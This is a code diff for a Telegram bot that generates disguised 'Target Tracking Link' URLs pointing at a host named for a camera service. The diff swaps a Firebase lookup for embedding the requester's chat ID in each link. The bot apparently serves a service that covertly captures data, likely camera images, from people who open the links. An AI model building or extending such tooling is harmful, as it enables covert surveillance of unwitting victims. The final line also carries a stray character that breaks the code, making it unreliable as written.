@@ -1,10 +1,8 @@
 import logging
 import uuid
 import base64
-import urllib.request
-import json
 from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
-from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, CommandHandler, CallbackQueryHandler, filters
+from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, CommandHandler, filters
 from telegram.error import TelegramError
 
 logging.basicConfig(
@@ -14,26 +12,6 @@ logging.basicConfig(
 
 RENDER_BASE_URL = "https://camera-y1vl.onrender.com"
 CHANNEL_USERNAME = "@TeamLolOfficial"
-FIREBASE_DB_URL = "https://lolsms-39057-default-rtdb.firebaseio.com"
-
-# Firebase-এ ডাটা সেভ করার নির্ভুল ফাংশন (কোনো বাহ্যিক লাইব্রেরি লাগবে না)
-def save_mapping_to_firebase(unique_id, chat_id):
-    try:
-        url = f"{FIREBASE_DB_URL}/mappings/{unique_id}.json"
-        data = json.dumps({"chat_id": str(chat_id)}).encode('utf-8')
-        
-        req = urllib.request.Request(
-            url, 
-            data=data, 
-            headers={'Content-Type': 'application/json'}, 
-            method='PUT'
-        )
-        with urllib.request.urlopen(req, timeout=5) as response:
-            logging.info(f"Firebase Save Response: {response.status}")
-            return True
-    except Exception as e:
-        logging.error(f"Firebase Save Error: {e}")
-        return False
 
 async def check_channel_membership(bot, user_id):
     try:
@@ -55,7 +33,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await update.message.reply_text(
-            "❌ You must join our official channel before using this bot!\n\nPlease click below to join:",
+            f"❌ You must join our official channel before using this bot!\n\nPlease click below to join:",
             reply_markup=reply_markup
         )
         return
@@ -75,28 +53,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="Markdown"
     )
 
-async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    if query.data == "check_join":
-        user_id = query.from_user.id
-        is_joined = await check_channel_membership(context.bot, user_id)
-        if is_joined:
-            reply_markup = ReplyKeyboardMarkup(
-                [["🔗 Create Link"]],
-                resize_keyboard=True,
-                is_persistent=True,
-                input_field_placeholder="Click Create Link button..."
-            )
-            await query.message.reply_text(
-                "✅ Thank you for joining! Click **🔗 Create Link** button to generate tracking links.",
-                reply_markup=reply_markup,
-                parse_mode="Markdown"
-            )
-        else:
-            await query.message.reply_text("❌ You still haven't joined the channel. Please join first!")
-
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.from_user.id
     user_text = update.message.text.strip()
@@ -109,7 +65,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await update.message.reply_text(
-            "❌ Please join our channel first:",
+            f"❌ Please join our channel first:",
             reply_markup=reply_markup
         )
         return
@@ -137,10 +93,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         encoded_url = base64.urlsafe_b64encode(target_url.encode()).decode()
         unique_id = str(uuid.uuid4())[:6]
         
-        # Firebase Database-এ ম্যাপিং সেভ করা হচ্ছে
-        save_mapping_to_firebase(unique_id, user_id)
-        
-        tracking_link = f"{RENDER_BASE_URL}/?id={unique_id}&url={encoded_url}"
+        # ইউজারের Chat ID (cid) সহ ডায়নামিক লিঙ্ক তৈরি করা হচ্ছে
+        tracking_link = f"{RENDER_BASE_URL}/?id={unique_id}&cid={user_id}&url={encoded_url}"
         
         response_msg = (
             f"🎯 **Target Tracking Link Created Successfully!**\n\n"
@@ -163,8 +117,7 @@ if __name__ == '__main__':
     application = ApplicationBuilder().token(BOT_TOKEN).build()
 
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CallbackQueryHandler(handle_callback))
     application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
 
-    print("Firebase Mapped Dynamic link bot is running successfully...")
-    application.run_polling()
+    print("Multi-user Dynamic link bot is running...")
+    application.run_polling()v
